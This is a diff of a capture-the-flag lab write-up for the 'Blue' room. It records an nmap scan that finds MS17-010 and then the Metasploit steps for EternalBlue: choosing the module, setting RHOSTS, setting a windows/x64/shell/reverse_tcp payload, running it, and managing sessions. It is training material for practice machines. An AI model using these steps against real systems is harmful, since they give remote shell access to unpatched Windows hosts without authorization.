@@ -1,4 +1,5 @@
-# Task 1 Recon
+# Blue CTF
+## Task 1 Recon
 
 Start with simple nmap scan
 ```                                                                         
@@ -34,25 +35,22 @@ Start with simple nmap scan
 	|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
 	|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
 	|_smb-vuln-ms10-054: false
-	
-	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-	Nmap done: 1 IP address (1 host up) scanned in 152.68 seconds
 ```
   
-## Q1: no answer required
+### Q1: no answer required
 	
-## Q2: Ports under 1000 
+### Q2: Ports under 1000 
 Answer: 3 in total
 	
-## Q3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
+### Q3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
 Answer: MS17-010 clearly visible from nmap when --script vuln used.
 	
 
-# Task 2: Gain Access
+## Task 2: Gain Access
 	
-## Q1: no answer required
+### Q1: no answer required
 
-## Q2: Find the exploit code we will run against the machine:
+### Q2: Find the exploit code we will run against the machine:
 	
 Start msfconsole then search for ms17_010, option 0 contains:
 Answer: exploit/windows/smb/ms17_010_eternalblue the question is vague but it's pretty obvious this is the first one that matches. The all start exploit/windows/smb/. The answer is rated average, one below is rated great and should have been a better bet:
@@ -62,16 +60,16 @@ Answer: exploit/windows/smb/ms17_010_eternalblue the question is vague but it's 
 Next to select exploit enter :
 	use 0
 
-## Q3 :Use show options to learn what needs changing:
+### Q3 :Use show options to learn what needs changing:
 	Answer: RHOSTS
 	
 Then enter the RHOST IP with:
 	Set RHOSTS <target-IP>
 	
-## Q4: Then change the payload to the given:  no response required
+### Q4: Then change the payload to the given:  no response required
 	set payload windows/x64/shell/reverse_tcp
 	
-## Q5: Run no response required
+### Q5: Run no response required
 	Then run and a meterpreter prompt appears.
 	
 	This states background using ctrl + Z, here is a summary of the important commands here:
@@ -83,7 +81,7 @@ Then enter the RHOST IP with:
 	Sessions -K	        Kills all sessions running
 	
 	
-# Task3: 
+## Task3: 
 ## Q1: Research online how to convert a shell to meterpreter shell in metasploit
 	
 Quick google search for meterpreter shell in metasploit and a rapid7 link appears (module_name below).
